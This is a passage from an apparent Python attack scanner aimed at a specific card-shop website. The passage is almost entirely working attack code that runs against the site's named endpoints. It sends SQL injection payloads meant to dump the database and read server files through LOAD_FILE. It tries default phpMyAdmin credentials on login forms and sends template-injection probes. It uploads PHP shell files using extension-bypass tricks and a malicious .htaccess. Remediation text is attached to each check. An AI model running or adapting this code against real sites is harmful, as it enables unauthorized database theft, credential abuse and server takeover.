                        self.logger.debug(f"[php] lfi {endpoint} {param}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 10. Database dump via SQL injection
    # -----------------------------------------------------------------------

    def _check_db_dump_via_sqli(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing SQL injection for database dump...")

        # Key injectable endpoints based on JS analysis
        sqli_targets = [
            # (url, method, data_template)
            (base + "/money_view.php", "GET", {"check_order": "PAYLOAD"}),
            (base + "/money_view.php", "GET", {"get_history": "PAYLOAD"}),
            (base + "/cc_buy.php",     "POST", {"cardid": "PAYLOAD"}),
            (base + "/bin_search.php", "POST", {"data": "PAYLOAD"}),
            (base + "/cc_list.php",    "GET",  {"get_card": "PAYLOAD"}),
            (base + "/cc_list.php",    "GET",  {"seecc": "PAYLOAD"}),
        ]

        db_error_patterns = [
            r"SQL syntax",
            r"mysql_fetch",
            r"SQLSTATE\[",
            r"You have an error in your SQL",
            r"Warning: mysql",
            r"ORA-\d{5}",
            r"PG::SyntaxError",
            r"sqlite3\.OperationalError",
            r"Microsoft OLE DB",
            r"Unclosed quotation mark",
        ]

        version_extraction_patterns = [
            r"5\.\d+\.\d+",    # MySQL 5.x
            r"8\.\d+\.\d+",    # MySQL 8.x
            r"10\.\d+\.\d+",   # MariaDB 10.x
            r"PostgreSQL \d+",
        ]

        load_file_success = [
            "root:x:0:0",          # /etc/passwd
            "[boot loader]",        # win.ini
            "[fonts]",
        ]

        for url, method, data_template in sqli_targets:
            for payload in DB_DUMP_PAYLOADS:
                try:
                    data = {k: (payload if v == "PAYLOAD" else v)
                            for k, v in data_template.items()}

                    if method == "GET":
                        qs = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in data.items())
                        r = self.http.get(f"{url}?{qs}")
                    else:
                        r = self.http.post(url, data=data)

                    if not r:
                        continue

                    body = r.text
                    param_name = list(data_template.keys())[0]

                    # Check for DB errors (error-based SQLi)
                    error_matches = [p for p in db_error_patterns if re.search(p, body, re.IGNORECASE)]
                    if error_matches:
                        findings.append(Finding(
                            title=f"SQL Injection (Error-Based): Database Error in '{param_name}'",
                            severity="CRITICAL",
                            owasp="A3:2021",
                            cwe="CWE-89",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            url=url,
                            parameter=param_name,
                            payload=payload[:80],
                            description=(
                                f"SQL injection detected in '{param_name}' via error-based technique. "
                                f"DB error patterns matched: {error_matches}. "
                                "Database: likely MySQL/MariaDB based on error format."
                            ),
                            impact=(
                                "Full database dump: extract all tables, user credentials, "
                                "payment card data, session tokens. "
                                "Potential server file read via LOAD_FILE() and webshell "
                                "deployment via INTO OUTFILE."
                            ),
                            remediation=(
                                "Use PDO prepared statements with parameterized queries. "
                                "Never concatenate user input into SQL strings. "
                                "Disable display_errors in production. "
                                "Restrict MySQL FILE privilege."
                            ),
                            references=[
                                "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
                                "https://portswigger.net/web-security/sql-injection",
                            ],
                            evidence=f"{method} {param_name}={payload[:40]}... -> DB error: {error_matches}",
                            confirmed=True,
                            vuln_type="SQL Injection / Database Dump",
                        ))
                        break

                    # Check for LOAD_FILE success (file contents returned)
                    for lf_marker in load_file_success:
                        if lf_marker in body and "LOAD_FILE" in payload:
                            findings.append(Finding(
                                title=f"SQL Injection: Server File Read via LOAD_FILE() in '{param_name}'",
                                severity="CRITICAL",
                                owasp="A3:2021",
                                cwe="CWE-89",
                                cvss_score=10.0,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                url=url,
                                parameter=param_name,
                                payload=payload[:80],
                                description=(
                                    f"SQL injection in '{param_name}' with LOAD_FILE() successfully "
                                    "read a server file (matched: '{lf_marker}'). "
                                    "MySQL user has the FILE privilege."
                                ),
                                impact=(
                                    "Read ANY file the MySQL process can access: config.php, .env, "
                                    "/etc/passwd, SSH keys. Write webshell via INTO OUTFILE."
                                ),
                                remediation=(
                                    "Revoke FILE privilege from MySQL app user. "
                                    "Use least-privilege DB accounts. Fix SQLi with prepared statements."
                                ),
                                references=["https://owasp.org/www-project-top-ten/2021/A03_2021-Injection"],
                                evidence=f"LOAD_FILE via SQLi returned file content marker: '{lf_marker}'",
                                confirmed=True,
                                vuln_type="SQL Injection / File Read via LOAD_FILE",
                            ))
                            break

                    # Check for version disclosure in UNION results
                    ver_matches = [p for p in version_extraction_patterns
                                   if re.search(p, body) and "version()" in payload.lower()]
                    if ver_matches and "UNION" in payload:
                        db_ver = re.search("|".join(version_extraction_patterns), body)
                        findings.append(Finding(
                            title=f"SQL Injection (UNION): Database Version Extracted from '{param_name}'",
                            severity="CRITICAL",
                            owasp="A3:2021",
                            cwe="CWE-89",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            url=url,
                            parameter=param_name,
                            payload=payload[:80],
                            description=(
                                f"UNION-based SQL injection in '{param_name}' returned the "
                                f"database version: {db_ver.group(0) if db_ver else 'detected'}. "
                                "Full table enumeration and data dump is now possible."
                            ),
                            impact=(
                                "Full database dump: enumerate all schemas, tables, columns. "
                                "Extract user credentials, payment data, session tokens."
                            ),
                            remediation="Use parameterized queries. Implement WAF. Restrict DB permissions.",
                            references=["https://owasp.org/www-project-top-ten/2021/A03_2021-Injection"],
                            evidence=f"UNION payload returned DB version in response",
                            confirmed=True,
                            vuln_type="SQL Injection / UNION Data Extraction",
                        ))
                        break

                except Exception as e:
                    self.logger.debug(f"[php] sqli {url}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 11. phpMyAdmin default / weak credential test
    # -----------------------------------------------------------------------

    def _check_phpmyadmin_default_creds(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing phpMyAdmin default credentials...")

        pma_paths = ["/phpmyadmin/", "/pma/", "/phpMyAdmin/"]
        login_endpoints = ["/phpmyadmin/index.php", "/pma/index.php", "/phpMyAdmin/index.php"]

        for login_url in login_endpoints:
            full_url = base + login_url
            try:
                # First check if it exists
                r = self.http.get(full_url)
                if not r or r.status_code != 200:
                    continue
                if "phpMyAdmin" not in r.text and "pma" not in r.text.lower():
                    continue

                # Extract token if present
                token_match = re.search(r'name="token"\s+value="([^"]+)"', r.text)
                token = token_match.group(1) if token_match else ""

                for username, password in PMA_DEFAULT_CREDS:
                    try:
                        login_data = {
                            "pma_username": username,
                            "pma_password": password,
                            "server": "1",
                            "token": token,
                        }
                        lr = self.http.post(full_url, data=login_data)
                        if not lr:
                            continue

                        # Success indicators
                        if ("pma_navigation" in lr.text or
                                "phpMyAdmin" in lr.text and "logout" in lr.text.lower() or
                                "information_schema" in lr.text):
                            findings.append(Finding(
                                title=f"phpMyAdmin Default Credentials: {username}/{password or '(empty)'}",
                                severity="CRITICAL",
                                owasp="A7:2021",
                                cwe="CWE-1392",
                                cvss_score=10.0,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                url=full_url,
                                parameter="pma_username / pma_password",
                                payload=f"{username}:{password or '(empty)'}",
                                description=(
                                    f"phpMyAdmin accepted default credentials: "
                                    f"username='{username}', password='{password or '(empty)'}'. "
                                    "An attacker has full MySQL administrative access."
                                ),
                                impact=(
                                    "Complete database compromise: read/write all tables, "
                                    "execute arbitrary SQL, use LOAD_FILE to read server files, "
                                    "use INTO OUTFILE to write webshells."
                                ),
                                remediation=(
                                    "Change MySQL root password immediately. "
                                    "Restrict phpMyAdmin to localhost/VPN. "
                                    "Enable HTTP Basic Auth on phpMyAdmin directory."
                                ),
                                references=[
                                    "https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures",
                                    "https://docs.phpmyadmin.net/en/latest/setup.html",
                                ],
                                evidence=f"POST {login_url} with {username}:{password or 'empty'} -> authenticated",
                                confirmed=True,
                                vuln_type="Default Credentials / Full DB Access",
                            ))
                            break
                    except Exception:
                        pass
            except Exception as e:
                self.logger.debug(f"[php] pma creds {login_url}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 12. Server-Side Template Injection (SSTI)
    # -----------------------------------------------------------------------

    def _check_ssti(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing Server-Side Template Injection (SSTI)...")

        ssti_params = [
            "name", "message", "search", "query", "template",
            "title", "subject", "content", "text", "body",
        ]

        test_endpoints = [
            base + "/index.php",
            base + "/",
        ]

        for endpoint in test_endpoints:
            for param in ssti_params:
                for payload in SSTI_PAYLOADS:
                    try:
                        r = self.http.get(
                            f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        )
                        if not r or r.status_code not in (200,):
                            continue

                        # Check for 7*7=49 being evaluated
                        if "49" in r.text and "7*7" not in r.text:
                            findings.append(Finding(
                                title=f"Server-Side Template Injection (SSTI) via '{param}'",
                                severity="CRITICAL",
                                owasp="A3:2021",
                                cwe="CWE-94",
                                cvss_score=10.0,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                url=f"{endpoint}?{param}=<payload>",
                                parameter=param,
                                payload=payload,
                                description=(
                                    f"The parameter '{param}' is passed to a PHP template engine "
                                    f"without sanitization. Payload '{payload}' evaluated to '49', "
                                    "indicating template expression evaluation."
                                ),
                                impact=(
                                    "Remote Code Execution: SSTI in Twig/Smarty allows executing "
                                    "arbitrary PHP code, reading files, and full server compromise."
                                ),
                                remediation=(
                                    "Never pass user input directly to template render functions. "
                                    "Use template sandboxing. Validate and escape all template variables."
                                ),
                                references=[
                                    "https://portswigger.net/research/server-side-template-injection",
                                    "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
                                ],
                                evidence=f"'{payload}' evaluated, response contains '49'",
                                confirmed=True,
                                vuln_type="SSTI / Remote Code Execution",
                            ))
                            break
                    except Exception as e:
                        self.logger.debug(f"[php] ssti {endpoint} {param}: {e}")

        return findings

    # -----------------------------------------------------------------------
    # 13. Webshell upload via file upload endpoints
    # -----------------------------------------------------------------------

    def _check_file_upload_webshell(self, base: str) -> list[Finding]:
        findings = []
        self.logger.info("[php] Testing file upload for webshell upload...")

        upload_endpoints = [
            base + "/upload.php",
            base + "/uploads/",
            base + "/upload/",
            base + "/file_upload.php",
            base + "/admin/upload.php",
            base + "/images/upload.php",
        ]

        # Minimal PHP webshell (for detection proof-of-concept only)
        shell_content = b"<?php echo 'UPLOAD_TEST_' . md5('webshell'); ?>"

        # Try common bypass techniques
        upload_attempts = [
            ("shell.php",      "application/x-php",       shell_content),
            ("shell.php.jpg",  "image/jpeg",              shell_content),
            ("shell.phtml",    "application/x-php",       shell_content),
            ("shell.php5",     "application/x-php",       shell_content),
            ("shell.pHp",      "application/x-php",       shell_content),
            ("shell.php%00.jpg","image/jpeg",             shell_content),
            (".htaccess",      "text/plain",              b"AddType application/x-httpd-php .jpg"),
        ]

        for endpoint in upload_endpoints:
            try:
                # First check if endpoint exists
                r = self.http.get(endpoint)
                if not r or r.status_code not in (200, 403, 405):
                    continue

                for filename, content_type, content in upload_attempts:
                    try:
                        files = {"file": (filename, content, content_type)}
                        ur = self.http.post(endpoint, files=files)
                        if not ur:
                            continue

                        body = ur.text
                        # Check for success indicators
                        if any(kw in body.lower() for kw in
                               ["success", "uploaded", "file saved", filename.replace("php", "").strip(".")]):
                            # Try to access the uploaded file
                            upload_paths = [
                                f"/uploads/{filename}",
                                f"/upload/{filename}",
                                f"/images/{filename}",
                                f"/files/{filename}",
                                f"/tmp/{filename}",
                            ]
                            for upath in upload_paths:
                                try:
                                    vr = self.http.get(base + upath)
                                    if vr and "UPLOAD_TEST_" in vr.text:
                                        import hashlib
                                        expected = "UPLOAD_TEST_" + hashlib.md5(b"webshell").hexdigest()
                                        if expected in vr.text:
                                            findings.append(Finding(
                                                title=f"Webshell Upload Successful via '{endpoint}'",
                                                severity="CRITICAL",
                                                owasp="A3:2021",
                                                cwe="CWE-434",
                                                cvss_score=10.0,
                                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                                url=endpoint,
                                                parameter="file (multipart upload)",
                                                payload=f"filename={filename}, Content-Type={content_type}",
                                                description=(
                                                    f"A PHP file disguised as '{filename}' with "
                                                    f"Content-Type: {content_type} was uploaded to "
                                                    f"{endpoint} and executed at {base + upath}."
                                                ),
                                                impact=(
                                                    "Full server compromise via web shell: "
                                                    "RCE, file read, database dump, lateral movement."
                                                ),
                                                remediation=(
                                                    "Validate file type using MIME detection (not extension). "
                                                    "Store uploads outside web root. "
                                                    "Serve uploads via X-Content-Type-Options: nosniff. "
                                                    "Rename uploaded files to random names with safe extension."
                                                ),
                                                references=[
                                                    "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
                                                    "https://owasp.org/www-project-top-ten/2021/A03_2021-Injection",
                                                ],
                                                evidence=f"Uploaded {filename} -> executed at {base + upath}",
                                                confirmed=True,
                                                vuln_type="Unrestricted File Upload / Webshell",
                                            ))
                                except Exception:
                                    pass
                    except Exception:
                        pass
            except Exception as e:
                self.logger.debug(f"[php] upload {endpoint}: {e}")

        return findings
